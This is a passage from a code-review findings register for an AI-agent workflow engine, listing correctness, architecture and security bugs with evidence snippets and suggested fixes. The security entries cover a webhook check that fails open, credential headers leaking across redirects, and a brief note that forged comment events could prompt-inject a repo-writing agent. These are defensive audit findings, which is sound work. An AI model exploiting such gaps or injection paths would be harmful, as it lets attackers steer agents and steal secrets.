- **Re-verification note:** `autoWrap` still searches `templateStore.list()` (which filters `hidden=0`) for a `hidden === 1` row, so every expansion creates a new hidden template and, through `syncTemplate`, a new inbound webhook with its own secret; the name-based key would also collide across same-labeled nodes. Key reuse on (source template id, node key, config hash) looked up with `includeHidden`, and skip hook provisioning for hidden templates.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-19
- **Location:** `lib/engine/step-flows.ts:425-456`, `lib/engine/templates.ts:291-300`, `lib/engine/templates.ts:389-390`, `lib/engine/hooks.ts:71-88`
- **Problem:** `autoWrap` searches `templateStore.list()`, which defaults to `WHERE hidden=0`, for a template with `hidden === 1`, so `existing` is always `undefined`. Each expansion creates another `flow_templates` row. `create()` → `syncTriggers` → `hookStore.syncTemplate` also provisions a webhook (with secret) for each hidden template, and every one of those endpoints can start flows. If the lookup were fixed as written, it would be wrong in a different way: it matches by display name (`${label} · step`) across all templates, so two different nodes labeled "Agent" would share one child template with the first node's config.
- **Evidence:**
  ```ts
  const name = `${spec.label} · step`;
  const existing = templateStore.list().find((t) => t.hidden === 1 && t.name === name);
  if (existing) return existing.id;
  ```
- **Suggested fix:** Key reuse on something deterministic, such as `(source template id, node key, config hash)` stored on the hidden row. Look it up with `list({ includeHidden: true })` or a dedicated query. Skip hook provisioning for hidden templates.
- **Effort:** M

### CR-065 [Medium] Flows read the live template graph, so the "snapshot" guarantee is only partly true

- **Status:** Fixed (Task 24)
- **Current location:** lib/engine/templates/template-store.ts:169-179,405-410,494-503,704-722, lib/engine/flow-engine.ts:858-860
- **Re-verification note:** Only `nodes.config` is snapshotted; `graphForFlow` still re-reads the live template (edges, triggers, wait_for, input_map, joins) on every call, `updateNodeTemplate` has no active-flow guard, and the comments still claim "running flows snapshot at creation and are never affected by template edits". Either snapshot the graph onto the flow at create time, or correct the comments and extend `assertNotRunning` to `updateNodeTemplate`/`deleteNodeTemplate` for referenced definitions; memoize the graph per `advanceFrom`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-20
- **Status:** Needs verification
  - ENG-20: "Whether declarative defs re-hydrate from the live `node_templates.config` falls under `lib/engine/nodes/` and needs verification by that reviewer."
- **Location:** `lib/engine/templates.ts:232-237`, `lib/engine/templates.ts:552-560`, `lib/engine/templates.ts:762-780`, `lib/engine/flow.ts:99-100`, `lib/engine/flow.ts:850-852`
- **Problem:** Only `nodes.config` is snapshotted. Edges, triggers, `wait_for`, `input_map`, join modes and the node kind (`nodeKind` reads `node_templates.kind` live) are all re-read from `flow_templates*` on every engine call through `graphForFlow`. The only protection is `assertNotRunning` on structural `update()`. `updateNodeTemplate` (catalog definition edits) has no such guard. Whether declarative defs re-hydrate from the live `node_templates.config` falls under `lib/engine/nodes/` and needs verification by that reviewer. Comments such as "running flows are never mutated by later template edits" and "snapshots are safe" are therefore misleading. Every edge evaluation also re-runs two queries per call (performance).
- **Evidence:**
  ```ts
  graphForFlow(flowId: string): TemplateGraph | null {
    const tid = db.get<{ template_id: string | null }>(
      `SELECT template_id FROM flows WHERE id=?`, flowId)?.template_id ?? null;
    return this.graph(tid ?? SDLC_TEMPLATE_ID);
  }
  ```
- **Suggested fix:** Either snapshot the graph (edges and node specs) onto the flow at create time and read from there, or fix the comments and extend `assertNotRunning` to `updateNodeTemplate`/`deleteNodeTemplate` for definitions referenced by active flows. Add a per-call memo of the graph within a single `advanceFrom`.
- **Effort:** L

### CR-066 [Medium] Flow `delete()` does not stop in-flight work or clear in-memory engine state

- **Status at `abaa007`:** **Fixed** (Task 17 — atomic `claim` / `attempt_id`; PR link TBD)
- **Current location:** lib/engine/flow-engine.ts:546-567
- **Re-verification note:** `delete()` still only removes worktrees and then deletes table rows per flow; it does not cancel running/waiting nodes or in-flight merges, clear `waitTimers`/in-memory state, or run the deletes in one transaction, so background work keeps writing to a deleted flow. Cancel every running/waiting node of the flow and its children first, refuse while `mergeArena.isMerging(child)`, drop timer entries, and wrap the deletes in one transaction.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-21
- **Related:** CR-012 (ENG-07, DATA-29) — fix CR-012 first: run the table deletes in one transaction; CR-061 (ENG-16); CR-114 (APP-12, DATA-23); CR-159 (TOOL-06)
- **Location:** `lib/engine/flow.ts:453-475`, `lib/engine/flow.ts:1681`
- **Problem:** Deleting a flow while a node is `running` (or a merge or fan-out child is in flight) does not cancel agent runs, and it leaves `waitTimers`, `claimedStarts` and `lastReconcile` entries behind. The background tasks keep going and then write events, runs and artifacts for a flow that no longer exists. With FKs enforced these writes throw, including inside `bg()`'s catch (see ENG-16 (CR-061)), or they leave orphan rows if FKs are off.
- **Evidence:**
  ```ts
  await Promise.allSettled(ids.map((fid) =>
    worktreeManager.removeFlowWorktree(fid, { reason: "flow deleted" })));
  for (const fid of ids) {
    for (const table of FLOW_CHILD_TABLES) {
      db.run(`DELETE FROM ${table} WHERE flow_id=?`, fid);
  ```
- **Suggested fix:** Before deleting, `cancelNode` every `running`/`waiting` node of the flow and its children, and refuse while a `mergeArena.isMerging(child)` is true (or abort it). Drop the timer entries. Run the table deletes in one transaction (ENG-07 (CR-012)).
- **Effort:** M

### CR-067 [Medium] Failed YAML import "rollback" deletes pre-existing node templates it merely reused

- **Status:** **Fixed** ([Task 12](review-tasks/12-db-transactions.md) — `ensureNodeTemplate` returns `{ id, created }`; import runs in `db.transaction`)

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-22
- **Related:** CR-012 (ENG-07, DATA-29) — fix CR-012 first: use the shared transaction primitive
- **Location:** `lib/engine/templates-yaml.ts:251-263`, `lib/engine/templates-yaml.ts:292-298`, `lib/engine/templates.ts:804-807`
- **Problem:** `ensureNodeTemplate` returns the id of an existing identical row when one exists. The importer pushes that id into `createdNodeTemplateIds` unconditionally. If the import later fails (lint error, unknown node), the rollback calls `deleteNodeTemplate` on it, which removes a user's existing Library definition whenever no template currently references it.
- **Evidence:**
  ```ts
  nodeTemplateId = store.ensureNodeTemplate({ key: entry.key, name: entry.label ?? entry.key, kind: entry.type, config: entry.config });
  createdNodeTemplateIds.push(nodeTemplateId);
  ```
- **Suggested fix:** Have `ensureNodeTemplate` return `{ id, created }`, the same shape as `createOrReuseNodeTemplate`, and push only when `created`.
- **Effort:** S

### CR-068 [Medium] SSRF guard forwards all request headers, secrets included, across cross-host redirects

- **Status at `abaa007`:** **Open**, fix in [Task 60](review-tasks/60-security-process-and-network-isolation.md)
- **Current location:** lib/net/ssrf-guard.ts:79-99,121-145
- **Re-verification note:** On redirect the guard re-validates the target against the allowlist but still replays `req.headers` (which carry interpolated `{{secrets.*}}`) to the new host, and allowlist entries match subdomains, so credentials leak across cross-origin redirects. Drop `authorization`/`cookie`/`proxy-authorization` and secret-bearing headers when `next.origin !== url.origin`, or refuse cross-origin redirects unless explicitly enabled.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-23
- **Related:** CR-002 (APP-02)
- **Location:** `lib/net/ssrf-guard.ts:85-99`, `lib/net/ssrf-guard.ts:141-146`
- **Problem:** On a redirect the guard re-validates the target against the allowlist but replays `req.headers` unchanged. Those headers carry interpolated `{{secrets.*}}`. Allowlist entries match every subdomain, so `api.example.com` redirecting to `uploads.example.com` (user content, for example) receives the `Authorization` header. Browsers' `fetch` strips credentials on cross-origin redirects.
- **Evidence:**
  ```ts
  const next = new URL(res.headers.location, url);
  url = assertUrlPolicy(next.toString(), req.allowlist); // every hop re-validated
  ...
  continue; // next hop reuses req.headers verbatim
  ```
- **Suggested fix:** When `next.origin !== url.origin`, drop `authorization`, `cookie`, `proxy-authorization` and any header whose value contains a secret (or all user headers). Alternatively, stop following cross-origin redirects unless explicitly configured.
- **Effort:** S

### CR-069 [Medium] GitLab webhook verification fails open when `GITLAB_WEBHOOK_SECRET` is unset, and compares the token with a non-constant-time `===`

- **Status at `abaa007`:** **Open**, fix in [Task 58](review-tasks/58-security-webhook-auth.md)
- **Current location:** lib/config.ts:21-24, lib/engine/ports/git-host.ts:193-194, lib/integrations/gitlab/git-host.ts:244-248, app/api/webhooks/gitlab/route.ts:28
- **Re-verification note:** Unchanged. `verifyWebhook` still returns true when `GITLAB_WEBHOOK_SECRET` is unset and compares `x-gitlab-token` with `===`; the config doc still says "unset = accept all". Fix: deny by default, with an explicit `GITLAB_WEBHOOK_ALLOW_UNSIGNED=1` opt-in and a startup warning. Compare with `crypto.timingSafeEqual` over sha256 digests (the same pattern `lib/engine/runtime/hook-store.ts:136-140` already uses) and update the port doc.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib; Area 4 — DB, git, integrations
- **Source:** ENG-24, DATA-08 (merged duplicate)
- **Related:** CR-001 (APP-01); CR-044 (APP-08); CR-196 (ENG-48)
- **Location:**
  - ENG-24: `lib/config.ts:23-28`, `lib/engine/ports/git-host.ts:192-193`
  - DATA-08: `lib/integrations/gitlab/git-host.ts:244-248`
- **Suggested fix (combined):** Change the config contract in `lib/config.ts` from "unset = accept all" to deny-by-default, with an explicit opt-in (e.g. `GITLAB_WEBHOOK_ALLOW_UNSIGNED=1`) for local dev and a startup warning. In `GitHostService.verifyWebhook` (`lib/integrations/gitlab/git-host.ts`) return false when no secret is configured and compare with `crypto.timingSafeEqual` over equal-length buffers. Update the port doc in `lib/engine/ports/git-host.ts`.
- **Effort:** S (sources: ENG-24 S, DATA-08 S)

Original findings, verbatim:

#### ENG-24 (Area 2 — Engine core & shared lib): GitLab webhook authentication is fail-open when `GITLAB_WEBHOOK_SECRET` is unset

- **Severity:** Medium
- **Category:** Correctness
- **Location:** `lib/config.ts:23-28`, `lib/engine/ports/git-host.ts:192-193`
- **Problem:** The config contract is "unset = accept all", and `GitHostService.verifyWebhook` is specified as "True when no secret is configured". Anyone who can reach `/api/webhooks/gitlab` can then inject comment and pipeline events, which drive `ingestComments` and `triggerPipelineGate` (agent runs that cost money and push code). The verifier itself lives in `lib/integrations` (another reviewer's area); the fail-open default is defined here.
- **Evidence:**
  ```ts
  /** Optional shared-secret check for /api/webhooks/gitlab (unset = accept all). */
  webhookSecret(): string {
    return AppConfig.env("GITLAB_WEBHOOK_SECRET");
  }
  ```
- **Suggested fix:** Default to deny when no secret is set (at least in production), and log a startup warning. Alternatively, require an explicit `GITLAB_WEBHOOK_ALLOW_UNSIGNED=1` opt-in for local dev.
- **Effort:** S

#### DATA-08 (Area 4 — DB, git, integrations): GitLab webhook verification fails open when no secret is set and uses a non-constant-time compare

- **Severity:** Medium
- **Category:** Correctness
- **Location:** `lib/integrations/gitlab/git-host.ts:244-248`
- **Problem:** With no `config.gitlab.webhookSecret()`, every request is accepted. Anyone who can reach the endpoint can inject `cr_comment` events, which drive the resolve agent with attacker-chosen comment bodies (prompt injection into an agent with repo write access), or fake `pipeline` status events. The `===` comparison is also timing-unsafe.
- **Evidence:**
  ```ts
  const secret = config.gitlab.webhookSecret();
  if (!secret) return true;
  return headers.get("x-gitlab-token") === secret;
  ```
- **Suggested fix:** Fail closed (return false and log once) when no secret is configured, or gate the fallback behind an explicit `allowUnsignedWebhooks` config flag. Compare with `crypto.timingSafeEqual` over equal-length buffers.
- **Effort:** S

### CR-070 [Medium] `FlowEngine` is a god class with about ten responsibilities in 1,800 lines

- **Status at `abaa007`:** **Open**, fix in [Task 45](review-tasks/45-flow-engine-decomposition.md)
- **Current location:** lib/engine/flow-engine.ts:89-2039 (create/createStepChild/createSplitChild 95-285, get/list 358-535, plan-step editing 788-857, edge/join/skip machine 966-1163, wait timers 1290-1335 and 1904-1943, triggers/webhook starts 1757-1903, MR lookup and comment ingestion 1971-2039)
- **Re-verification note:** The file grew from about 1,800 to 2,039 lines. Split-runtime proxies (skip/retry/approve/cancelSplitUnit, finishSplit) were added alongside the existing responsibilities. Only the SDLC chain, the split manager and the step-flow manager live outside it. Extract FlowFactory, FlowReadModel, EdgeActivator, WaitScheduler and CommentIngestor/MrLocator behind a thin facade, one per PR.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-26
- **Related:** CR-006 (ENG-01); CR-054 (ENG-09); CR-091 (NODE-25)
- **Location:** `lib/engine/flow.ts:84-1806`
- **Problem:** One class owns:
  - flow creation and snapshotting (90-215)
  - read-model aggregation with cost rollups (265-440)
  - deletion (453)
  - plan-step editing (650-717)
  - the edge/join/skip state machine (792-967)
  - wait-timer scheduling (1087-1131, 1674-1716)
  - trigger and webhook flow starts (1537-1672)
  - restart recovery (1724-1746)
  - git-host MR lookup and comment ingestion (1751-1805)
  - fan-out proxies (1406-1440)
  
  It breaks AGENTS.md section 3.1 ("one responsibility"). It also explains several bugs above (status logic spread across methods, ENG-09 (CR-054)/10/11) and makes the required "service classes have tests" impractical.
- **Evidence:**
  ```ts
  export class FlowEngine {
    private readonly chain = createSdlcChain(this);
    create(...) / get(...) / list() / delete(...) / updatePlanSteps(...)
    advanceFrom(...) / armNodeWait(...) / processWaitTimers()
    startFromTemplate(...) / resumeNodeFromWebhook(...) / ingestComments(...)
  ```
- **Suggested fix:** Extract, with constructor-injected dependencies:
  - `FlowFactory` (create, createStepChild, startFromTemplate)
  - `FlowReadModel` (get, list)
  - `EdgeActivator` (advanceFrom, join, skip, loop)
  - `WaitScheduler` (timers, which also fixes ENG-01 (CR-006))
  - `CommentIngestor` / `MrLocator`
  - a thin `FlowEngine` facade
  
  Do it incrementally, one class per PR.
- **Effort:** L

### CR-071 [Medium] Engine classes embed raw SQL instead of going through row mappers and stores

- **Status at `abaa007`:** **Partly fixed**, fix in [Task 44](review-tasks/44-engine-stores-and-constants.md)
- **Current location:** lib/engine/flow-engine.ts (51 raw db/rows calls; `SELECT id FROM nodes WHERE flow_id=? AND node_key=?` at 306, 347, 1011, 1121, 1301, 1361, 1931), lib/engine/runtime/fanout/step-flow-manager.ts (14 calls, e.g. 632, 739), lib/engine/runtime/flow-reconciler.ts:59-67,174 (9 calls), lib/engine/runtime/flow-poller.ts
- **Re-verification note:** Node kinds now go through `NodeSupport` (lib/engine/nodes/shared/node-support.ts) and `PlanStore`. The "latest plan" query is down to two helpers: `NodeSupport.latestArtifact` and `FlowEngine.latestResourceArtifact`. The engine and runtime orchestrators still spell node status, id lookups and comment upserts as ad-hoc SQL. Remaining fix: a `NodeStore` (idOf/status/setStatus/claim) and a `CommentStore` backed by `rows.ts`, used in flow-engine, step-flow-manager and flow-reconciler.

- **Severity:** Medium
- **Category:** Boundaries
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-27
- **Related:** CR-012 (ENG-07, DATA-29); CR-051 (APP-16); CR-054 (ENG-09); CR-115 (DATA-24)
- **Location:** `lib/engine/flow.ts` (for example 116-120, 250-255, 1143-1170, 1493-1498, 1783-1802), `lib/engine/step-flows.ts` (292, 371, 689, 827, 845-848, 1183), `lib/engine/reconcile.ts:130-200`, `lib/engine/poller.ts:50-57`, `lib/engine/poller.ts:112-115`
- **Problem:** Status transitions, artifact queries and comment upserts are spelled as ad-hoc SQL strings in every orchestrator. The same query appears in several places: the "latest plan artifact" query four times (`flow.ts:653-655`, `flow.ts:1143-1145`, `flow.ts:1166-1168`, `step-flows.ts:181-183`), and `SELECT id FROM nodes WHERE flow_id=? AND node_key=?` many times. Schema changes have to be coordinated across these files, contrary to AGENTS.md section 1 ("Schema changes must be coordinated with row mappers"). It also blocks transactional and claim semantics (ENG-07 (CR-012), ENG-09 (CR-054)).
- **Evidence:**
  ```ts
  db.run(`UPDATE nodes SET status='awaiting_approval', updated_at=? WHERE flow_id=? AND node_key=?`,
    db.now(), childFlowId, childNodeKey);
  ```
- **Suggested fix:** Introduce a `NodeStore` (`status`, `setStatus`, `claim`, `idOf`, `output`), an `ArtifactStore.latestPlan(flowId)` and a `CommentStore.upsert`, all backed by `rows.ts` mappers. Migrate call sites as they are touched.
- **Effort:** L

### CR-072 [Medium] `current_node` pointer lifecycle is inconsistent (never cleared, or cleared unconditionally)

- **Status at `abaa007`:** **Fixed** (Task 17 — atomic `claim` / `attempt_id`; PR link TBD)
- **Current location:** lib/engine/flow-engine.ts:598-614 (bg has no clear), 1658-1692 (retryNode sets the pointer at 1673, never clears it), 1726-1746 (sendChat clears unconditionally on success at 1744, never on failure), 788-791 (assertPlanEditable blocks on the pointer); lib/engine/nodes/chains/sdlc-chain.ts:103,157,182,202 (unconditional null); lib/engine/runtime/flow-reconciler.ts:59-67
- **Re-verification note:** Plan runs now go through `sendChat`. A failed plan chat therefore leaves `current_node` set, and checklist edits stay blocked until the throttled reconcile. A successful chat can also wipe a pointer that another stage now owns. Fix: in `bg()`'s `finally`, call `clearCurrentIf(flowId, nodeKey)` when `nodeKey` is set, and remove the ad-hoc `setCurrentNode(flowId, null)` calls.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-29
- **Location:** `lib/engine/flow.ts:618-647`, `lib/engine/flow.ts:1465-1482`, `lib/engine/flow.ts:1515-1526`, `lib/engine/flow.ts:650-656`, `lib/engine/reconcile.ts:59-67`
- **Problem:**
  - `startPlan`, `refinePlan` and `retryNode` set `current_node` and never clear it. `clearCurrentIf` is called only from `startNodeStage`, `runNodeManual`, `approveNode`, `chooseNode` and `finishFanout`.
  - `sendChat` clears it unconditionally on success, even when another stage now owns the pointer, and never clears it on failure.
  - `assertPlanEditable` throws while the pointer is set ("wait for the plan run to finish"), so checklist edits stay blocked until the throttled reconcile (20 s, only while the page polls) clears the stale pointer.
- **Evidence:**
  ```ts
  this.bg(flowId, nodeKey, async () => {
    const reply = chatOnly ? await def.converse(...) : await def.chat(...);
    db.addMessage(flowId, nodeKey, "assistant", reply || "Done.");
    this.setCurrentNode(flowId, null);
  });
  ```
- **Suggested fix:** Clear in `bg()`'s `finally` via `clearCurrentIf(flowId, nodeKey)` when `nodeKey` is set, and remove the ad-hoc clears. Longer term, derive "busy" from node statuses instead of a single mutable pointer.
- **Effort:** S

### CR-073 [Medium] Worktree lifecycle events stamp the node row id as `nodeKey`, misrouting them in the feed

- **Status:** Fixed (Task 33)
- **Current location:** lib/engine/runtime/worktree-lifecycle.ts:112-114, 131-135, 144-146, 230-232, 242-243, 248-249, 254
- **Re-verification note:** Unchanged. `opts.nodeId`/`target.nodeId` is a `nodes.id` (callers pass `node.id`), but it is also written into `data.nodeKey`, so feed routing by nodeKey gets a row id. Fix: thread the real node key through opts (or resolve it from the id), or drop `nodeKey` from data when a node id is passed.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 2 — Engine core & shared lib
- **Source:** ENG-30
- **Location:** `lib/engine/worktree-lifecycle.ts:112-114`, `lib/engine/worktree-lifecycle.ts:131-135`, `lib/engine/worktree-lifecycle.ts:144-146`, `lib/engine/worktree-lifecycle.ts:230-232`, `lib/engine/worktree-lifecycle.ts:242-243`, `lib/engine/worktree-lifecycle.ts:248-249`, `lib/engine/worktree-lifecycle.ts:254`
- **Problem:** `opts.nodeId` is a `nodes.id`; it is passed as `emitEvent`'s node-id argument. The same value is also written into `data.nodeKey`. The chat feed routes flow-level events by `data.nodeKey` (`groupEvents.flowEventNodeKeys`), so whenever `nodeId` is null and the id lands in `nodeKey`, the event never matches a tab. In the other case the field is simply wrong data.
- **Evidence:**
  ```ts
  db.emitEvent(flow.id, opts.nodeId ?? null, "lifecycle",
    `setting up worktree (branch ${branch})…`,
    { nodeKey: opts.nodeId ?? undefined, branch });
  ```
- **Suggested fix:** Pass the actual node key through `opts` (or resolve it from the id), or drop `nodeKey` from the data when `nodeId` is set.
- **Effort:** S

### CR-074 [Medium] Per-branch cost attribution never applies: `tagLatestRun` runs after the run row is already closed

- **Status at `abaa007`:** **Open**, fix in [Task 18](review-tasks/18-terminal-outcome-writer.md)
- **Current location:** lib/engine/nodes/kinds/build/build-node.ts:327-333, lib/engine/nodes/kinds/build/branch-store.ts:39-45, lib/engine/harness/agent-runner.ts:168-169, lib/engine/nodes/shared/agent-run-node.ts:132-134
- **Re-verification note:** `execute()` runs `finalize` only after `executeRun` has already closed the run row to finished/error. `tagLatestRun`'s `WHERE node_id=? AND status='running'` therefore never matches, and `runs.branch_id` stays null. Fix: return the run row id from `executeRun` (or pass a branchId option) and tag `WHERE id=?`.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-08
- **Location:** `lib/engine/nodes/build/build-node.ts:258-264`, `lib/engine/nodes/build/branch-store.ts:40-45`, `lib/engine/nodes/base/agent-runner.ts:168-169`
- **Problem:** `finalizeBuild` runs inside `execute()` *after* `executeRun` has already set the run to `finished`/`error`. `tagLatestRun` updates `WHERE node_id=? AND status='running'`, so it never matches, and `runs.branch_id` is never set.
- **Evidence:**
  ```ts
  db.run(`UPDATE runs SET branch_id=?, updated_at=? WHERE node_id=? AND status='running'`,
    branchRowId, db.now(), nodeId);
  ```
- **Suggested fix:** Tag by run id. Have `executeRun` return `runId`/`runRowId` (or accept a `branchId` in its options) and update `WHERE id=?`.
- **Effort:** S

### CR-075 [Medium] Pipeline gate treats "stale head", "API error" and "no pipeline" as the same thing, so it triggers duplicate pipelines

- **Status at `abaa007`:** **Fixed** (Task 22 — discriminated head lookup, post-fix grace from `runFix`, no trigger on API error)

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-09
- **Status:** Needs verification
  - NODE-09: "(Needs verification against GitLab's `head_pipeline` lag, but the code path is as described.)"
- **Related:** CR-011 (ENG-06)
- **Location:** `lib/engine/nodes/pipeline/pipeline-node.ts:163-177`, `lib/engine/nodes/pipeline/pipeline-node.ts:359-368`, `lib/engine/nodes/pipeline/pipeline-node.ts:479-491`
- **Problem:** `headPipeline()` returns `null` for three different situations: an API failure (`.catch(() => null)`), no head pipeline, and a head pipeline whose sha differs from the MR sha. After a fix push, the MR sha moves before GitLab attaches the new pipeline. So the fixed head is reported as `null`, not as the fixed pipeline. The `awaitingFixPipeline` grace logic only runs when `pipe != null`, so it never kicks in, and the gate triggers an API pipeline at once, racing the push's own pipeline. A transient `getChangeRequest` failure on the first poll does the same. (Needs verification against GitLab's `head_pipeline` lag, but the code path is as described.)
- **Evidence:**
  ```ts
  const cr = await host.getChangeRequest(repoUrl, mrIid).catch(() => null);
  ...
  if (!pipe || (cr.sha && pipe.sha && pipe.sha !== cr.sha)) return null;
  // later
  } else if (autoTrigger && !watchedId && !triggerAttempted && !awaitingFixPipeline) {
  ```
- **Suggested fix:** Return a discriminated result (`{kind:"ok"|"stale"|"none"|"error"}`). Start the fix grace window from `runFix` completion (set `fixWaitStart` there), not from seeing the fixed id. Never trigger on `error`; back off and retry instead.
- **Effort:** M

### CR-076 [Medium] Built-in nodes never validate their config against `configSchema` at run time

- **Status at `abaa007`:** **Fixed** in [Task 26](review-tasks/26-node-config-validation.md) (`parseRunConfig` on `NodeDefinition`, validated in `runNode` and `setNodeConfig`)
- **Current location:** lib/engine/templates/node-config.ts:146-150, lib/engine/nodes/kinds/pipeline/pipeline-node.ts:304-316, lib/engine/nodes/kinds/review/review-node.ts:149, lib/engine/nodes/chains/sdlc-chain.ts:69, lib/engine/flow-engine.ts:711-714 and 1601-1612 (setNodeConfig merges unvalidated)
- **Re-verification note:** Built-ins still read merged config through `configNumber`/`configString`, which accept 0, so `poll_interval_sec: 0` tight-loops the git host. `setNodeConfig` persists instance config without checking it against `configSchema`. Fix: add a base `parseConfig()` that runs `configSchema.parse` at the top of every `run()`/`turn()` and fails the node with a readable error. Validate in `setNodeConfig` too.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-10
- **Related:** CR-003 (APP-03)
- **Location:** `lib/engine/nodes/pipeline/pipeline-node.ts:281-293`, `lib/engine/nodes/review/review-node.ts:67,118-120`, `lib/engine/nodes/resolve/resolve-node.ts:50`, `lib/engine/nodes/plan/plan-node.ts:327-333`, `lib/engine/nodes/build/build-node.ts:149`
- **Problem:** Each built-in declares a strict Zod `configSchema` (e.g. `poll_interval_sec: min(1)`, `max_fix_attempts: int().min(1)`). But `run()` reads the merged layers through `configNumber`/`configString`/`typeof` checks, which accept `0` and any other finite number. A flow-snapshot or app-setting `poll_interval_sec: 0` turns the gate into a tight loop against the git host API, and `max_fix_attempts: 0` disables fixes. The schema only protects the UI.
- **Evidence:**
  ```ts
  const pollMs = configNumber(config, "poll_interval_sec", POLL_MS_DEFAULT / 1000) * 1000;
  // configNumber: if (typeof v === "number" && Number.isFinite(v) && v >= 0) return v;
  ```
- **Suggested fix:** In `NodeDefinition`, add `protected parseConfig(config) { return this.configSchema.parse(config) }`, call it at the top of every `run()`, and use the typed result. Fail the node with a readable error when it doesn't parse.
- **Effort:** M

### CR-077 [Medium] Declarative nodes silently drop *all* instance config when any field is invalid

- **Status at `abaa007`:** **Fixed** in [Task 26](review-tasks/26-node-config-validation.md) (`parseRunConfig` on `NodeDefinition`, validated in `runNode` and `setNodeConfig`)
- **Current location:** lib/engine/nodes/kinds/agent/agent-node.ts:420-423, lib/engine/nodes/kinds/http/http-node.ts:227-230, lib/engine/nodes/kinds/decision/decision-node.ts:272-275, lib/engine/nodes/kinds/script/script-node.ts:289-292
- **Re-verification note:** All four `runConfig()` copies still `safeParse` and silently fall back to `this.def` (the catalog row), discarding every instance override when one field is invalid. Fix: use `parseDeclarativeConfig(kind, config, label)` (lib/engine/nodes/declarative-schemas.ts:148) so the node fails loudly, written once in a shared declarative base.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-11
- **Related:** CR-093 (NODE-27)
- **Location:** `lib/engine/nodes/http/http-node.ts:229-232`, `lib/engine/nodes/agent/agent-node.ts:248-251`, `lib/engine/nodes/decision/decision-node.ts:276-279`, `lib/engine/nodes/script/script-node.ts:291-294`
- **Problem:** `runConfig()` uses `safeParse` and falls back to `this.def` (the catalog row's config) on failure. A single bad instance field (e.g. a lowercase `method`, or `timeout_ms` as a string) throws away every override: the HTTP node calls the *catalog* URL/headers, the script runs the catalog script, the decision uses the catalog choices. There's no error or event.
- **Evidence:**
  ```ts
  private runConfig(config: Record<string, unknown>): HttpDef {
    const parsed = HttpDefSchema.safeParse(config);
    return parsed.success ? parsed.data : this.def;
  }
  ```
- **Suggested fix:** Use `parseDeclarativeConfig(kind, config, label)`, which already throws readable errors, and let the node fail. Write it once in a shared declarative base helper (see NODE-27 (CR-093)).
- **Effort:** S

### CR-078 [Medium] Decision manual picks and legacy expression picks are checked against the catalog choices, not the instance's

- **Status at `abaa007`:** **Fixed** in [Task 26](review-tasks/26-node-config-validation.md) (`parseRunConfig` on `NodeDefinition`, validated in `runNode` and `setNodeConfig`)
- **Current location:** lib/engine/nodes/kinds/decision/decision-node.ts:111-137 (applyChoice/validateChoice/choiceLabels default to this.def), 293-302 (awaiting uses this.def labels); caller lib/engine/flow-engine.ts:1578-1579
- **Re-verification note:** Manual picks are still validated against the catalog row's choices, and `applyChoice` evaluates `pass` from `this.def`. Instance-edited choices are rejected and pass-down variables come from the wrong map. Fix: resolve `cfg = runConfig(nodeConfig(ctx))` in `applyChoice` (make ctx required) and thread cfg through `validateChoice`/`awaiting`. Drop the legacy-expression half of this finding. The legacy single global `expression` path still exists (decision-node.ts:213-224, `normalizeChosen` 377-393, `expression` field in declarative-schemas.ts:95) and is a delete-legacy-code candidate.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-12
- **Location:** `lib/engine/nodes/decision/decision-node.ts:111-125`, `lib/engine/nodes/decision/decision-node.ts:127-137`, `lib/engine/nodes/decision/decision-node.ts:298-306`, `lib/engine/nodes/decision/decision-node.ts:382-397`
- **Problem:** `applyChoice` → `validateChoice` → `choiceLabels()` defaults to `this.def`, the class-layer config. `evalPass(this.def, …)` ignores the instance `pass` map. `normalizeChosen` (legacy expression) and `awaiting()` also use `this.def`, while `run()` uses the merged `cfg`. When choices or `pass` are edited on the instance (the configurator exposes both as config fields), a valid manual pick is rejected ("not one of this decision's choices"), and pass-down variables come from the wrong map.
- **Evidence:**
  ```ts
  async applyChoice(node, flowId, chosen, rationale?, ctx?) {
    this.validateChoice(chosen);                 // → this.choiceLabels() → this.def
    const passed = ctx ? await this.evalPass(this.def, buildFlowContext(ctx)) : {};
  ```
- **Suggested fix:** Resolve `cfg = this.runConfig(this.nodeConfig(ctx))` in `applyChoice` (make `ctx` required) and thread `cfg` through `validateChoice`, `normalizeChosen` and `awaiting`. Remove the `this.def` defaults.
- **Effort:** S

### CR-079 [Medium] Decision `jsonataTruthy` doesn't follow JSONata truthiness, so empty arrays and objects pick a branch

- **Status at `abaa007`:** **Fixed** in [Task 26](review-tasks/26-node-config-validation.md) (`parseRunConfig` on `NodeDefinition`, validated in `runNode` and `setNodeConfig`)
- **Current location:** lib/engine/nodes/kinds/decision/decision-node.ts:15-17, 206
- **Re-verification note:** Unchanged. `jsonataTruthy` still treats `[]`, `{}`, `NaN` and all-falsy arrays as truthy, so an empty filter result picks a branch. Fix: port JSONata's `$boolean` cast (empty array or object, all-falsy arrays and NaN are false) and unit-test the edge cases.

- **Severity:** Medium
- **Category:** Correctness
- **Area:** Area 3 — Engine nodes
- **Source:** NODE-13
- **Related:** CR-041 (NODE-43, DATA-25, TOOL-03)
- **Location:** `lib/engine/nodes/decision/decision-node.ts:16-18`, `lib/engine/nodes/decision/decision-node.ts:206`
